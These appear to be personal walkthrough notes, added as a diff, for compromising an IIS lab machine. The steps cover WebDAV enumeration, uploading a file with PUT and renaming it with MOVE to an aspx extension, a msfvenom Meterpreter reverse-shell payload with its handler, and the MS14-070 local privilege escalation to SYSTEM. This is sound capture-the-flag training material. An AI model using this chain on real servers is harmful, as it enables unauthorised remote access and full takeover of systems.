@@ -1,0 +1,89 @@
+1. Port 80 iis server. 
+2. Gobuster 
+   gobuster dir  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 20 -u 10.10.10.15	
+3. Run nikto scan
+	nikto -host+ 10.10.10.15
+4. Run davtest ### This is to test out put options and see if we can insert a file from there, we will
+		## if we ca upload an executable file given that it is aspx server
+	davtest -url http://10.10.10.15
+5. With burp you can redirect web page to prxy to look at history within burp by causing a redirecty
+   To achieve this you create a proxy listener from 127.0.0.1 port 80 with a redirect to 10.10.10.15 
+   port 80 and then you can run davtest and see all requests from burp proxy automatically
+	davtest -url http://localhost
+
+#### OUTPUT #####
+********************************************************
+ Testing DAV connection
+OPEN		SUCCEED:		http://localhost
+********************************************************
+NOTE	Random string for this session: P0NGGi
+********************************************************
+ Creating directory
+MKCOL		SUCCEED:		Created http://localhost/DavTestDir_P0NGGi
+********************************************************
+ Sending test files
+PUT	asp	FAIL
+PUT	html	SUCCEED:	http://localhost/DavTestDir_P0NGGi/davtest_P0NGGi.html
+PUT	shtml	FAIL
+PUT	txt	SUCCEED:	http://localhost/DavTestDir_P0NGGi/davtest_P0NGGi.txt
+PUT	pl	SUCCEED:	http://localhost/DavTestDir_P0NGGi/davtest_P0NGGi.pl
+PUT	cfm	SUCCEED:	http://localhost/DavTestDir_P0NGGi/davtest_P0NGGi.cfm
+PUT	jsp	SUCCEED:	http://localhost/DavTestDir_P0NGGi/davtest_P0NGGi.jsp
+PUT	cgi	FAIL
+PUT	php	SUCCEED:	http://localhost/DavTestDir_P0NGGi/davtest_P0NGGi.php
+PUT	jhtml	SUCCEED:	http://localhost/DavTestDir_P0NGGi/davtest_P0NGGi.jhtml
+PUT	aspx	FAIL
+********************************************************
+ Checking for test file execution
+EXEC	html	SUCCEED:	http://localhost/DavTestDir_P0NGGi/davtest_P0NGGi.html
+EXEC	txt	SUCCEED:	http://localhost/DavTestDir_P0NGGi/davtest_P0NGGi.txt
+EXEC	pl	FAIL
+EXEC	cfm	FAIL
+EXEC	jsp	FAIL
+EXEC	php	FAIL
+EXEC	jhtml	FAIL
+
+********************************************************
+/usr/bin/davtest Summary:
+Created: http://localhost/DavTestDir_P0NGGi
+PUT File: http://localhost/DavTestDir_P0NGGi/davtest_P0NGGi.html
+PUT File: http://localhost/DavTestDir_P0NGGi/davtest_P0NGGi.txt
+PUT File: http://localhost/DavTestDir_P0NGGi/davtest_P0NGGi.pl
+PUT File: http://localhost/DavTestDir_P0NGGi/davtest_P0NGGi.cfm
+PUT File: http://localhost/DavTestDir_P0NGGi/davtest_P0NGGi.jsp
+PUT File: http://localhost/DavTestDir_P0NGGi/davtest_P0NGGi.php
+PUT File: http://localhost/DavTestDir_P0NGGi/davtest_P0NGGi.jhtml
+Executes: http://localhost/DavTestDir_P0NGGi/davtest_P0NGGi.html
+Executes: http://localhost/DavTestDir_P0NGGi/davtest_P0NGGi.txt
+#######
+
+6. Next up you identify that we the server is able to run aspx files. You can try uploading an aspx file
+   with the PUT method however this will not work, however you can use the MOVE method to transfer that
+   aspx file with the payload to move an html file to the location with a renamed aspx extension. This
+   can be achieved as follows:
+	msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.36 LPORT=1337 -f aspx
+	### Place payload in burp repeater using the PUT method and upload payload as html file
+	### Afterwards execute the MOVE method to trasfer the html to be used as an aspx file
+	### use msfconsole and create a multihandler
+	use exploit/multi/handler
+	set payload windows/meterpreter/reverse_tcp
+	set lhost tun0
+	set lport 1337
+	exploit -j
+
+7. Once you have gotten the shell search for suggestor on metasploit
+	search suggester
+	use post/multi/recon/local_exploit_suggester
+	
+8. You will find various exploits to run however, the use exploit/windows/local/ms14_070_tcpip_ioctl
+   will work, run it. And use sessions -i <number> and getuid to verify we have gotten system on the box.
+   Make sure that the correct lhost is set otherwise things may not work as expected.
+	use exploit/windows/local/ms14_070_tcpip_ioctl
+	set session 4
+	set LHOST tun0
+	set LPORT 5555
+	run
+	sessions -i 2
+	getuid
+	Server username: NT AUTHORITY\SYSTEM
+
